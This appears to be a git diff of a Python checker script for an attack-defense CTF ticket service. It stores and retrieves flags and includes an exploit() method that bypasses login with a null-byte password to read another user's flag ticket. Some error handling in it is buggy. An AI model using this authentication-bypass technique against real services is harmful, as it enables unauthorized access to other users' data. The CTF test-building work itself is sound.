@@ -1,41 +1,59 @@
 #!/usr/bin/env python3
 #socat TCP-LISTEN:7478,nodelay,reuseaddr,fork EXEC:"stdbuf -i0 -o0 -e0 ./a.out"
-import pwnlib.tubes 
+
+from pwn import * 
 import sys
 import time
 from enochecker import *
 import string
 from random import randrange
 
+
+#BrokenServiceException = broken but its reachable 
+#OfflineException = obvious
+
 class FlugChecker(BaseChecker):
 
     flag_count = 1
     noise_count = 1
     havoc_count = 1
+    global port 
     port = 7478
 
 
     def putflag(self):  # type: () -> None
-        port = 7478
         username = self.gen_user()
         password = self.gen_password()
+
         try:
             print('Connecting ...')
             p = remote(self.address,port)
-            #p= remote('localhost',7478)
             print("Connection succeded")
         except:
-            raise EnoException("Unable to connect to the service at putflag")
-        try:
-            print("Reistering a user with username: {} and password {}".format(username,password))
+            raise OfflineException("Unable to connect to the service [putflag]")
+
+        print("Reistering a user with username: {} and password {} [putflag]".format(username,password))
+
+
+        try:    
             p.recvuntil(b"================")
             p.sendlineafter(b"================",b"2")
             p.sendlineafter(b"Please input your new username:",bytes(username,'ascii'))
             p.sendlineafter(b"Please input your password:\n",bytes(password,'ascii'))
+        except:
+            raise BrokenServiceException("Registration failed [putflag]")
+
+
+        try:
             p.recvuntil(b"================\n")
             p.sendlineafter(b"================\n",b"1")
             p.sendlineafter(b"Please input your username:\n",bytes(username,'ascii'))
             p.sendlineafter(b"Please input your password:\n",bytes(password,'ascii'))
+        except:
+            raise BrokenServiceException("Login failed [putflag]")
+
+
+        try:
             p.recvuntil(b"================\n")   
             p.sendlineafter(b"================\n",b"1")
             time.sleep(.1)
@@ -43,6 +61,12 @@ class FlugChecker(BaseChecker):
             print("Putting in flag: {}".format(self.flag))
             p.sendline(bytes(self.flag,'ascii'))
             time.sleep(.1)
+
+        except:
+            raise BrokenServiceException("Put flag failed [putflag]")
+
+
+        try:
             p.recvuntil(b"================\n")
             p.sendlineafter(b"================\n",b"2")
             stdo = p.recvline()
@@ -50,17 +74,17 @@ class FlugChecker(BaseChecker):
             print("The new flag is at index: {}".format(ticket_id))
             self.team_db[self.flag] = (username,password,ticket_id)
         except:
-            raise EnoException("Put flag failed")
+            raise BrokenServiceException("There were problems with database or view tickets doesnt work [putflag]")
+
 
     def getflag(self):  # type: () -> None
-        port = 7478
         try:
             print('Connecting ...')
             p = remote(self.address,port)
-            #p= remote("localhost",7478)
             print("Connection succeded")
         except:
-            raise EnoException("Connection failed at getflag")
+            raise OfflineException("Connection failed [getflag]")
+
 
         try:
             print('Retrieveng Flag ...')
@@ -70,40 +94,59 @@ class FlugChecker(BaseChecker):
             p.recvline()
             p.recvline()
             flag2 = p.recvline().decode('ascii')
-            print('flag retireved: {}'.format(flag2))
-            print('flag should be: {}'.format(self.flag))
-            if flag2.strip() != self.flag.strip():
-                raise EnoException("The flags dont mach!")
         except:
-            raise EnoException("Unable to put flag in the service")
+            raise BrokenServiceException("Unable to get flag from the service [getflag]")
+        print('flag retireved: {}'.format(flag2))
+        print('flag should be: {}'.format(self.flag))
+        if flag2.strip() != self.flag.strip():
+            raise BrokenServiceException("The flags dont mach! [getflag]")
+
 
     def putnoise(self):  # type: () -> None
-        port = 7478
+
         username = self.gen_user()
         password = self.gen_password()
+
+
         try:
             print('Connecting ...')
             p = remote(self.address,port)
-            #p = remote('localhost',7478)
             print("Connection succeded")
         except:
-            raise EnoException("Connection failed at put noise")
+            raise enochecker("Connection failed at put noise")
+
+
+        print('Puting in noise with username: {} and password: {}'.format(username,password))
         try:
-            print('Puting in noise with username: {} and password: {}'.format(username,password))
             p.recvuntil(b"================\n")
             p.sendlineafter(b"================\n",b"2")
             p.sendlineafter(b"Please input your new username:\n",bytes(username,'ascii'))
             p.sendlineafter(b"Please input your password:\n",bytes(password,'ascii'))
+        except: 
+            raise BrokenServiceException("Registration failed [putnoise]")
+
+
+        try:
             p.recvuntil(b"================\n")
             p.sendlineafter(b"================\n",b"1")
             p.sendlineafter(b"Please input your username:\n",bytes(username,'ascii'))
             p.sendlineafter(b"Please input your password:\n",bytes(password,'ascii'))
+        except:
+            raise BrokenServiceException("Login failed [putnoise]")
+
+
+        try:
             p.recvuntil(b"================\n")   
             p.sendlineafter(b"================\n",b"1")
             time.sleep(.1)
             p.recvuntil(b"Enter the content of your new ticket\n")
             p.sendline(bytes(self.noise,'ascii'))
             print('puting in noise: {}'.format(self.noise))    
+        except:
+            raise BrokenServiceException("Putting in noise failed [putnoise]")
+
+
+        try:
             time.sleep(.1)
             p.recvuntil(b"================\n")
             p.sendlineafter(b"================\n",b"2")
@@ -111,22 +154,20 @@ class FlugChecker(BaseChecker):
             noise_id = p.recvline().decode('ascii').split(' ')[1]
             print('Noise is set at id: {}'.format(noise_id))
             self.team_db[self.noise] = (username,password,noise_id)
-
         except:
-            raise EnoException("Put noise failed")
+            raise BrokenServiceException("There were problems with database or view tickets [putnoise]")
 
 
         self.team_db["noise"] = self.noise
-
     def getnoise(self):  # type: () -> None
-        port = 7478
+
         try:
             print('Connecting ...')
             p = remote(self.address,port)
-            #p= remote("localhost",7478)
             print("Connection succeded")
         except:
-             raise EnoException("Connection at getnoise failed")
+             raise OfflineException("Connection failed [getnoise]")
+
 
         try:
             print("Getting noise ...")
@@ -139,9 +180,9 @@ class FlugChecker(BaseChecker):
             print('Got noise: {}'.format(noise2))
             print('Expected noise: {}'.format(self.noise))                 
             if noise2.strip() != self.noise.strip():
-                raise EnoException("Noises dont match")
+                raise BrokenServiceException("Noises dont match [getnoise]")
         except:
-            EnoException('Get noise failed')
+            BrokenServiceException('fail at [getnoise]')
         """
         This method retrieves noise in the service.
         The noise to be retrieved is inside self.flag
@@ -154,15 +195,15 @@ class FlugChecker(BaseChecker):
                 the preferred way to report errors in the service is by raising an appropriate enoexception
         """
     def havoc(self):  # type: () -> None
-        port = 7478
         try:
             self.putnoise()
             self.getnoise()
         except:
-            raise EnoException("Service mumbles")
-
-        p = remote(self.address,port)
-        #p = remote('localhost',7478)
+            raise BrokenServiceException("Get noise or putnoise failed [havoc]")
+        try:
+            p = remote(self.address,port)
+        except:
+            raise OfflineException('service is unreachable [havoc]')
         pass_test = True
 
 
@@ -174,25 +215,27 @@ class FlugChecker(BaseChecker):
         test_user = self.team_db[self.noise][0]
         test_pass = self.team_db[self.noise][1]
 
+        #we check for words in these arrs when checking the menu
         must_be_in_menu1 = ['menu','login','register','view ticket','exit']
         must_be_in_view_ticket_menu = ['ticket','id']
         must_be_in_menu_when_logged_in = ['buy ticket','view my tickets','view ticket','logout']
 
+        #Check first menu
         menu1 = p.recv(200).decode('ascii').lower()
         for elem in must_be_in_menu1:
             if elem not in menu1:
                 print('failed first test: \'{}\' not in menu'.format(elem))
-                pass_test = False
+                raise BrokenServiceException('Menu1 isnt ok [havoc]')
 
         sleep(.2)
         p.sendline(b'3')
         menu_after_view_ticket_global = p.recv(200).decode('ascii').lower()
 
-
+        #Check the view ticket message
         for elem in must_be_in_view_ticket_menu:
             if elem not in menu_after_view_ticket_global:
                 print('failed second test: \'{}\' not in menu'.format(elem))
-                pass_test = False
+                raise BrokenServiceException('View Ticket menu is not ok [havoc]')
         sleep(.2)
 
         p.sendline(test_ticket)
@@ -204,16 +247,12 @@ class FlugChecker(BaseChecker):
         logged_in_menu +=p.recv(130).decode('ascii').lower()
         print('+++++++++++\nmenu: {}\n+++++++++++++'.format(logged_in_menu))
         sleep(.3)
+
+        #Check the menu when logged in
         for elem in must_be_in_menu_when_logged_in:
             if elem not in logged_in_menu:
                 print('failed last test: \'{}\' not in menu'.format(elem))
-                pass_test = False
-
-        if not pass_test:
-            print('ni slo skoz')
-            raise EnoException('Service mumbles')
-        else:
-            print('we good!')
+                raise BrokenServiceException('menu when logged isnt ok [havoc]')
 
         """
         This method unleashes havoc on the app -> Do whatever you must to prove the service still works. Or not.
@@ -224,19 +263,32 @@ class FlugChecker(BaseChecker):
                 The preferred way to report Errors in the service is by raising an appropriate EnoException
         """
 
-    def exploit(self ):
-        port = 7478
+    def exploit(self):
         #1st vuln
         p = remote(self.address,port)
+        username = self.team_db[self.flag][0]
+
         p.recvuntil(b"================\n")
         p.sendlineafter(b"================\n",b'1')
         p.sendlineafter(b"Please input your username:\n",bytes(username,'ascii'))
         p.sendlineafter(b"Please input your password:\n",'\x00')
-        p.recvline() #TODO: odstrani ko urban popravi svoje randomly placed printfe
-        p.recv(2) 
-        check_line = p.recvline()
+        #p.recvline() #TODO: odstrani ko urban popravi svoje randomly placed printfe
+        p.recv(2)
+        check_line = p.recvline().decode('ascii').strip()
+        p.recvuntil(b"================\n")
+        p.sendlineafter(b"================\n",b"2")
+        stdo = p.recvline()
+        flag_id = p.recvline().decode('ascii').split(' ')[1]
+        p.recvuntil(b"================\n")
+        p.sendlineafter(b"================\n",b"3")
+        p.sendlineafter(b"Enter the unique id of your ticket",bytes(flag_id,'ascii'))
+        p.recvline()
+        p.recvline()
+        flag = p.recvline().decode('ascii').split()
+
+
         if username in check_line:
-            print("You got pwnd")
+            print(flag)
         else:
             print("Sad nox")
         pass
@@ -256,6 +308,7 @@ class FlugChecker(BaseChecker):
             rand_int = randrange(25)
             password += source[rand_int]
         return password
+
 
 
 
